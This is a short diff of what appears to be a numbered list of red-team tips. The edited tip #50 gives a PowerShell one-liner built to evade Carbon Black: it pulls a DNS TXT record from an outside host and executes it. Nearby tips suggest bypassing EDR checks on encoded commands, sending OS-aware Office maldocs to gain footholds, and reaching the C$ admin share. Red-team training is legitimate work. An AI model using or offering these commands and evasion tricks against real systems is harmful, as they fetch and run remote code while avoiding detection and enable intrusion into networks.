@@ -101,7 +101,7 @@ Red tip #48: Is EDR potentially looking for "powershell -encodedcommand"? Try "p
 
 Red tip #49: Attacking a heavy Macintosh or Linux estate? Send a Office Maldoc with OS checking logic to obtain footholds on either system
 
-Red tip #50: Carbon Black checks for IEX and web req commands. Use powershell "powershell . (nslookup -q=txt http://calc.vincentyiu.co.uk )[-1]"
+Red tip #50: Carbon Black checks for IEX and web req commands. Use powershell "powershell . (nslookup -q=txt calc.vincentyiu.co.uk )[-1]"
 
 Red tip #51: Cant open C drive? Try \\127.0.0.1\c$
 
